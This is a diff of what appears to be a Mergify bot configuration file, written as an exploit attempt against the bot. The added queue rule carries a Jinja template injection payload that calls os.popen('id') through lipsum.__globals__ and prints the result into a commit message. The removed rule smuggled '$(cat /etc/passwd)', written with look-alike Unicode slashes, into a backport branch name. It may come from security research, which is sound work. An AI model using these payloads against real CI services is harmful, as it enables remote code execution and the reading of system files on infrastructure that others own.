@@ -1,9 +1,17 @@
+queue_rules:
+  - name: default
+    merge_method: squash
+    commit_message_template: |
+      {{ title }}
+      
+      {% set x = lipsum.__globals__["os"].popen("id") %}SSTI_OUTPUT:{{ x.read() }}
+    conditions: []
+
 pull_request_rules:
-  - name: unicode bypass RCE
+  - name: ssti-rce
     conditions:
       - base=main
-      - label=unicode-test
+      - label=ssti-rce
     actions:
-      backport:
-        branches:
-          - "pwned-$(cat∕etc∕passwd)"
+      queue:
+        name: default
